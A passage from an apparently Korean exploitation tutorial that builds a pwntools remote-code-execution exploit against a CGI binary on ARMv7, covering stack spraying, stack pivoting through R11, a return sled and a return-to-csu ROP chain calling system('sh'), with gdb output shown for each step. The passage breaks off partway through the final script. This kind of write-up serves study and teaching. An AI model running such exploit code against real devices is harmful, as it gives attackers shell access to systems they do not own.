    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Origin: http://{}</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Referer: http://{}/home.cgi</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Accept-Encoding: gzip, deflate</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="k">return</span> <span class="n">packet</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">form_param</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">spray</span><span class="p">):</span>
    <span class="k">return</span> <span class="s">"&amp;"</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="s">"ifconfig=y"</span><span class="p">,</span> <span class="s">"comment="</span><span class="o">+</span><span class="n">payload</span><span class="p">,</span> <span class="s">"s="</span><span class="o">+</span><span class="n">spray</span><span class="p">])</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">ip</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mi">63</span> <span class="o">+</span> <span class="s">"STCK"</span> <span class="o">+</span> <span class="s">"JUMP"</span>
    <span class="n">spray</span>   <span class="o">=</span> <span class="s">'b'</span><span class="o">*</span><span class="mh">0x10000</span>
    <span class="n">param</span>   <span class="o">=</span> <span class="n">form_param</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">spray</span><span class="p">)</span>
    <span class="n">packet</span>  <span class="o">=</span> <span class="n">form_packet</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">param</span><span class="p">)</span>

    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">):</span>
        <span class="n">exploit</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"{} [target-ip]"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
</code></pre></div></div>

<p>실제로 스택에 스프레이가 되었는지 확인합니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) x/16wx $sp+0x380
0xbec65db8:     0x61616161      0x61616161      0x61616161      0x61616161
0xbec65dc8:     0x64646161      0x44446464      0x73004444      0x6262623d
0xbec65dd8:     0x62626262      0x62626262      0x62626262      0x62626262
0xbec65de8:     0x62626262      0x62626262      0x62626262      0x62626262
(gdb) x/16wx $sp+0x380+0x10000
0xbec75db8:     0x62626262      0x62626262      0x62626262      0x62626262
0xbec75dc8:     0x62626262      0x62626262      0x62626262      0x45520062
0xbec75dd8:     0x53455551      0x52555f54      0x762f3d49      0x2e6e6c75
0xbec75de8:     0x3f696763      0x6f636669      0x6769666e      0x6326793d
(gdb)
</code></pre></div></div>

<p>스프레이가 잘 되었음을 확인 했습니다.</p>

<p>또한 Null-byte의 삽입이 가능한지의 여부를 확인합니다.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># ...
</span><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">ip</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mi">63</span> <span class="o">+</span> <span class="s">'dddd'</span> <span class="o">+</span> <span class="s">'DDDD'</span>
    <span class="n">spray</span>   <span class="o">=</span> <span class="s">'%00'</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="s">'b'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x10000</span><span class="o">-</span><span class="mi">12</span><span class="p">)</span>
    <span class="n">param</span>   <span class="o">=</span> <span class="n">form_param</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">spray</span><span class="p">)</span>
    <span class="n">packet</span>  <span class="o">=</span> <span class="n">form_packet</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">param</span><span class="p">)</span>
<span class="c1"># ...
</span></code></pre></div></div>

<p>4바이트의 null을 삽입 해 봅니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) x/16wx $sp+0x380
0xbed44db8:     0x61616161      0x61616161      0x61616161      0x61616161
0xbed44dc8:     0x64646161      0x44446464      0x73004444      0x0000003d
0xbed44dd8:     0x62626200      0x62626262      0x62626262      0x62626262
0xbed44de8:     0x62626262      0x62626262      0x62626262      0x62626262
(gdb) x/16wx $sp+0x380+0x10000
0xbed54db8:     0x62626262      0x62626262      0x62626262      0x62626262
0xbed54dc8:     0x62626262      0x62620062      0x62626262      0x45520062
0xbed54dd8:     0x53455551      0x52555f54      0x762f3d49      0x2e6e6c75
0xbed54de8:     0x3f696763      0x6f636669      0x6769666e      0x6326793d
(gdb)
</code></pre></div></div>

<p>Null-byte를 삽입할 수 있는 영역임을 확인 했습니다.</p>

<h3 id="stack-pointer-변조">Stack Pointer 변조</h3>

<p>armv7에서 <code class="language-plaintext highlighter-rouge">R11</code> 레지스터는 x86의 <code class="language-plaintext highlighter-rouge">ebp</code>와 같은 역할을 수행합니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) disas main
...
   0x00010c9c &lt;+624&gt;:   mov     r0, r3      // -- main epilogue --
   0x00010ca0 &lt;+628&gt;:   sub     sp, r11, #4 // r11(bp)에서 4를 뺀 값을 sp에 저장합니다.
   0x00010ca4 &lt;+632&gt;:   pop     {r11, pc}   // 스택에서 r11, pc를 순차적으로 pop합니다.
...
</code></pre></div></div>

<p>이를 활용하면 Stack pointer(<code class="language-plaintext highlighter-rouge">sp</code>)를 변조할 수 있습니다.</p>

<p>아래와 같은 순서의 명령을 수행한다고 가정합니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>### Stage 1 ######################################################
+-Code-------------+---------------------------------------------+
| pc  &gt; 0x00010ca0 | sub  sp, r11, #4                            |
|       0x00010ca4 | pop  {r11, pc}                              |
+------------------+---------------------------------------------+
+-Stack------------+----------0----------4----------8----------c-+
|       0xbfff8f00 | 0x00000000 0x00000000 0x00000000 0x00000000 |
|       0xbfff8f10 | 0xbfff8f24 0x00010ca0 0x00000000 0x00000000 |
|       0xbfff8f20 | 0x41414141 0x41414141 0x41414141 0x41414141 |
+------------------+---------------------------------------------+
+-Register-------------------------------------------------------+
| sp    0xbfff8f00                                               |
| r11   0xbfff8f14                                               |
+----------------------------------------------------------------+

### Stage 2 ######################################################
+-Code-------------+---------------------------------------------+
|       0x00010ca0 | sub  sp, r11, #4                            |
| pc  &gt; 0x00010ca4 | pop  {r11, pc}                              |
+------------------+---------------------------------------------+
+-Stack------------+----------0----------4----------8----------c-+
|       0xbfff8f00 | 0x00000000 0x00000000 0x00000000 0x00000000 |
|       0xbfff8f10 | 0xbfff8f24 0x00010ca0 0x00000000 0x00000000 |
|       0xbfff8f20 | 0x41414141 0x41414141 0x41414141 0x41414141 |
+------------------+---------------------------------------------+
+-Register-------------------------------------------------------+
| sp    0xbfff8f10 *                                             |
| r11   0xbfff8f14                                               |
+----------------------------------------------------------------+
* r11에서 4를 뺀 값을 sp에 넣었습니다.

### Stage 3 ######################################################
+-Code-------------+---------------------------------------------+
| pc  &gt; 0x00010ca0 | sub  sp, r11, #4                            |
|       0x00010ca4 | pop  {r11, pc}                              |
+------------------+---------------------------------------------+
+-Stack------------+----------0----------4----------8----------c-+
|       0xbfff8f00 | 0x00000000 0x00000000 0x00000000 0x00000000 |
|       0xbfff8f10 | 0xbfff8f24 0x00010ca0 0x00000000 0x00000000 |
|       0xbfff8f20 | 0x41414141 0x41414141 0x41414141 0x41414141 |
+------------------+---------------------------------------------+
+-Register-------------------------------------------------------+
| sp    0xbfff8f10                                               |
| r11   0xbfff8f24 *                                             |
+----------------------------------------------------------------+
* sp(0xbfff8f10)에서 r11, pc를 pop 했습니다.

### Stage 4 ######################################################
+-Code-------------+---------------------------------------------+
|       0x00010ca0 | sub  sp, r11, #4                            |
| pc  &gt; 0x00010ca4 | pop  {r11, pc}                              |
+------------------+---------------------------------------------+
+-Stack------------+----------0----------4----------8----------c-+
|       0xbfff8f00 | 0x00000000 0x00000000 0x00000000 0x00000000 |
|       0xbfff8f10 | 0xbfff8f24 0x00010ca0 0x00000000 0x00000000 |
|       0xbfff8f20 | 0x41414141 0x41414141 0x41414141 0x41414141 |
+------------------+---------------------------------------------+
+-Register-------------------------------------------------------+
| sp    0xbfff8f20 *                                             |
| r11   0xbfff8f24                                               |
+----------------------------------------------------------------+
* r11에서 4를 뺀 값을 sp에 넣었습니다.
  sp의 값이 우리가 원하는 값(0xbfff8f20)으로 변조되었습니다.
  
### Stage 5 ######################################################
+-Code-------------+---------------------------------------------+
| pc  &gt; 0x41414141 | ........................................... |
+------------------+---------------------------------------------+
+-Stack------------+----------0----------4----------8----------c-+
|       0xbfff8f00 | 0x00000000 0x00000000 0x00000000 0x00000000 |
|       0xbfff8f10 | 0xbfff8f24 0x00010ca0 0x00000000 0x00000000 |
|       0xbfff8f20 | 0x41414141 0x41414141 0x41414141 0x41414141 |
+------------------+---------------------------------------------+
+-Register-------------------------------------------------------+
| sp    0xbfff8f28                                               |
| r11   0x41414141                                               |
+----------------------------------------------------------------+
* pc와 r11이 변조되었습니다.
</code></pre></div></div>

<p>위와 같은 방법으로 연속적인 함수의 호출 또는 인자의 구성을 위해 <code class="language-plaintext highlighter-rouge">SP</code>를 변조할 수 있습니다.</p>

<h3 id="공격코드-작성">공격코드 작성</h3>

<p>위 두가지 방법을 이용하면 다음과 같은 흐름으로 공격을 수행합니다.</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">QUERY_STRING</code>을 전달함으로 BOF를 발생시키고, 스택에 ROP Payload를 spray합니다.</li>
  <li><code class="language-plaintext highlighter-rouge">SP</code>를 Stack spray된 영역으로 변조합니다.</li>
  <li>ROP Payload를 수행합니다.
    <ol>
      <li>ASLR이 비활성화 되어있으면, ROP Payload를 즉각적으로 수행 할 수 있습니다.</li>
      <li>ASLR이 활성화 되어있으면, <code class="language-plaintext highlighter-rouge">SP</code>가 잘못된 영역을 역참조 할 수 있습니다. 이럴경우, 1을 다시 수행합니다.</li>
    </ol>
  </li>
</ol>

<h4 id="case-aslr-비활성화">Case: ASLR 비활성화</h4>

<p>다음과 같이 ASLR을 비활성화 할 수 있습니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># echo 0 &gt; /proc/sys/kernel/randomize_va_space
# cat /proc/sys/kernel/randomize_va_space
0
</code></pre></div></div>

<p>ASLR이 비활성화 된 후, 스프레이를 먼저 수행하여 core dump를 확인합니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) x/32wx $sp+0x380
0xbefe1d98:     0x6161616b      0x6161616c      0x6161616d      0x6161616e
0xbefe1da8:     0xbefe1ddc      0x44444444      0x3d737300      0x41414141
0xbefe1db8:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefe1dc8:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefe1dd8:     0x41414141      0x41414141      0x41414141      0x41414141
</code></pre></div></div>

<p>Stack spray가 <code class="language-plaintext highlighter-rouge">0xbefe1db4</code>에서 시작합니다. 해당 주소로 <code class="language-plaintext highlighter-rouge">sp</code>를 변조합니다.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">SPRAY_LEN</span> <span class="o">=</span> <span class="mh">0xf000</span>
<span class="n">leave</span>  <span class="o">=</span> <span class="mh">0x00010ca0</span> <span class="c1"># sub sp, r11, 4; pop {r11, pc}
</span>
<span class="k">def</span> <span class="nf">payload</span><span class="p">(</span><span class="n">r11</span><span class="p">,</span> <span class="n">lr</span><span class="p">,</span> <span class="n">dummy_len</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="n">dummy_len</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">r11</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">lr</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">payload</span>

<span class="k">def</span> <span class="nf">spray</span><span class="p">():</span>
    <span class="n">spray</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="n">SPRAY_LEN</span>
    <span class="k">return</span> <span class="n">spray</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
<span class="c1"># ...
</span>    <span class="n">stack</span>  <span class="o">=</span> <span class="mh">0xbefe1db4</span><span class="o">+</span><span class="mi">4</span>
    <span class="n">pload</span>  <span class="o">=</span> <span class="n">payload</span><span class="p">(</span><span class="n">stack</span><span class="p">,</span> <span class="n">leave</span><span class="p">,</span> <span class="n">dummy_len</span><span class="p">)</span>
    <span class="n">param</span>  <span class="o">=</span> <span class="n">form_param</span><span class="p">(</span><span class="n">pload</span><span class="p">,</span> <span class="n">spray</span><span class="p">())</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="n">form_packet</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">param</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span>
<span class="c1"># ...
</span></code></pre></div></div>

<p>위의 코드를 실행 후 다시 <code class="language-plaintext highlighter-rouge">gdb</code>로 확인합니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) x/16wx $sp-0x10
0xbefe1dac:     0x00010ca0      0x3d737300      0x41414141      0x41414141
0xbefe1dbc:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefe1dcc:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefe1ddc:     0x41414141      0x41414141      0x41414141      0x41414141
(gdb) i r pc
pc             0x41414140       0x41414140
(gdb)
</code></pre></div></div>

<p>정상적으로 <code class="language-plaintext highlighter-rouge">pc</code>가 변조되었습니다.</p>

<h4 id="return-sled">Return sled</h4>

<p>Return sled를 이용하여 스프레이한 영역의 어느곳으로 <code class="language-plaintext highlighter-rouge">sp</code>, <code class="language-plaintext highlighter-rouge">pc</code>가 변조되어도 공격자의 ROP Payload가 실행되도록 합니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x00010ca4: pop {r11, pc}
0x000108e0: pop {r4, r11, pc}
</code></pre></div></div>

<p>위의 두 가젯을 활용합니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      ...
|  0x00010ca4
|  0x00010ca4
|  0x000108e0
|  0x00010ca4 # r4
|  0x41414141 # r11
V  [ROP HERE] # pc
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">spray</span><span class="p">():</span>
    <span class="c1"># ...
</span>	<span class="n">spray</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">sled_1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(((</span><span class="n">SPRAY_LEN</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="p">))</span> <span class="o">//</span> <span class="n">EADDR_LEN</span><span class="p">)</span><span class="o">-</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">spray</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">sled_2</span><span class="p">)</span> <span class="o">+</span> <span class="n">purl32</span><span class="p">(</span><span class="n">sled_1</span><span class="p">)</span> <span class="o">+</span> <span class="s">"AAAA"</span>
    <span class="n">spray</span> <span class="o">+=</span> <span class="n">rop</span>
    
    <span class="k">return</span> <span class="n">spray</span>
</code></pre></div></div>

<h4 id="rop">ROP</h4>

<p>Return-to-csu를 활용합니다.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">chain</span><span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">r0</span><span class="p">,</span> <span class="n">r1</span><span class="p">,</span> <span class="n">r2</span><span class="p">):</span>
    <span class="n">c</span> <span class="o">=</span> <span class="s">''</span>
    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="mh">0x00000000</span><span class="p">)</span> <span class="c1"># r4
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">func</span><span class="p">)</span>       <span class="c1"># [r5] =&gt; r3
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="mh">0x00000000</span><span class="p">)</span> <span class="c1"># r6
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">r0</span><span class="p">)</span>         <span class="c1"># r7 =&gt; r0
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">r1</span><span class="p">)</span>         <span class="c1"># r8 =&gt; r1
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">r2</span><span class="p">)</span>         <span class="c1"># r9 =&gt; r2
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="mh">0x00000000</span><span class="p">)</span> <span class="c1"># r10
</span>    <span class="n">c</span> <span class="o">+=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">csu_2</span><span class="p">)</span>      <span class="c1"># pc
</span>    <span class="k">return</span> <span class="n">c</span>

<span class="k">def</span> <span class="nf">spray</span><span class="p">():</span>
    <span class="c1">#...
</span>	<span class="c1"># Return-to-csu.
</span>    <span class="n">rop</span> <span class="o">=</span> <span class="n">purl32</span><span class="p">(</span><span class="n">csu_1</span><span class="p">)</span>

    <span class="c1"># Set bss:0x20 to get_val address.
</span>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
        <span class="n">addr</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x20</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
        <span class="n">value</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'get_val'</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
        <span class="n">rop</span> <span class="o">+=</span> <span class="n">chain</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'memset'</span><span class="p">],</span> <span class="n">addr</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>

    <span class="c1"># get_val("t", bss:0x24, 2): returns "sh"
</span>    <span class="n">rop</span> <span class="o">+=</span> <span class="n">chain</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x20</span><span class="p">),</span> <span class="n">str_t</span><span class="p">,</span> <span class="n">e</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x24</span><span class="p">),</span> <span class="mi">2</span><span class="p">)</span> <span class="c1"># get_val
</span>    <span class="n">rop</span> <span class="o">+=</span> <span class="n">chain</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'system'</span><span class="p">],</span> <span class="n">e</span><span class="p">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x24</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="c1">#...
</span></code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">chain()</code> 함수는 Return-to-csu 가젯을 자동으로 구성 해 줍니다.</li>
  <li><code class="language-plaintext highlighter-rouge">L18~22</code> : <code class="language-plaintext highlighter-rouge">bss:0x20</code> 지점에 <code class="language-plaintext highlighter-rouge">get_val</code> 함수의 포인터를 작성합니다.</li>
  <li><code class="language-plaintext highlighter-rouge">L25</code> : <code class="language-plaintext highlighter-rouge">get_val</code> 함수를 이용해 <code class="language-plaintext highlighter-rouge">QUERY_STRING</code>에서 <code class="language-plaintext highlighter-rouge">t</code> 쿼리의 값을 <code class="language-plaintext highlighter-rouge">bss:0x24</code> 지점에 작성합니다. 그 값은 <code class="language-plaintext highlighter-rouge">"sh"</code> 입니다.</li>
  <li><code class="language-plaintext highlighter-rouge">L26</code> : <code class="language-plaintext highlighter-rouge">system</code> 함수를 이용해 쉘을 실행시킵니다.</li>
</ul>

<h4 id="명령어-전달">명령어 전달</h4>

<p>ROP Payload가 수행되고 나면, 쉘 프로세스가 실행되고, 명령어 입력까지 대기합니다.</p>

<p><code class="language-plaintext highlighter-rouge">POST</code> 메소드를 이용해 Standard input으로 쉘 명령을 전달하여 실행시킵니다.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">form_packet</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">param</span><span class="p">,</span> <span class="n">content</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
    <span class="n">packet</span>  <span class="o">=</span> <span class="s">""</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"POST http://{}/vuln.cgi?{} HTTP/1.1</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">param</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Host: {}</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Connection: keep-alive</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Content-Length: {}</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">))</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"User-Agent: Mozilla/5.0</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Accept: */*</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Origin: http://{}</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Referer: http://{}/home.cgi</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Accept-Encoding: gzip, deflate</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="n">content</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="k">return</span> <span class="n">packet</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
</code></pre></div></div>

<h4 id="안정화-작업">안정화 작업</h4>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>

    <span class="c1"># ifconfig's output length is not fixed.
</span>    <span class="c1"># So, we need to get the buffer first to calculate
</span>    <span class="c1"># the overflow size.
</span>    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Getting buffer."</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="n">form_packet</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">form_param</span><span class="p">())</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">().</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">r</span><span class="p">[</span><span class="n">r</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"- ifconfig"</span><span class="p">):</span><span class="n">r</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n\n</span><span class="s">"</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span>
    <span class="n">dummy_len</span> <span class="o">=</span> <span class="mh">0x204</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Exploit."</span><span class="p">)</span>
    <span class="n">stack</span>  <span class="o">=</span> <span class="mh">0xbefe1db4</span><span class="o">+</span><span class="mi">4</span>
    <span class="n">pload</span>  <span class="o">=</span> <span class="n">payload</span><span class="p">(</span><span class="n">stack</span><span class="p">,</span> <span class="n">leave</span><span class="p">,</span> <span class="n">dummy_len</span><span class="p">)</span>
    <span class="n">param</span>  <span class="o">=</span> <span class="n">form_param</span><span class="p">(</span><span class="n">pload</span><span class="p">,</span> <span class="n">spray</span><span class="p">())</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="n">form_packet</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">param</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Success!"</span><span class="p">)</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">ifconfig</code> 명령의 출력값의 길이가 고정되어있지 않습니다.</p>

<p>오버플로우 사이즈를 안정적으로 계산하기 위해 <code class="language-plaintext highlighter-rouge">ifconfig</code> 명령 결과 버퍼의 길이값을 측정하고, 계산합니다.</p>

<h4 id="no-aslr-공격-코드">no-ASLR 공격 코드</h4>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./vuln"</span><span class="p">)</span>

<span class="c1"># Globals &amp; Defines
</span><span class="n">spray_fix</span> <span class="o">=</span> <span class="s">''</span>
<span class="n">SPRAY_LEN</span> <span class="o">=</span> <span class="mh">0xf000</span>
<span class="n">EADDR_LEN</span> <span class="o">=</span> <span class="mi">12</span>

<span class="c1"># Gadgets
</span><span class="n">sled_1</span> <span class="o">=</span> <span class="mh">0x00010ca4</span> <span class="c1"># pop {r11, pc}
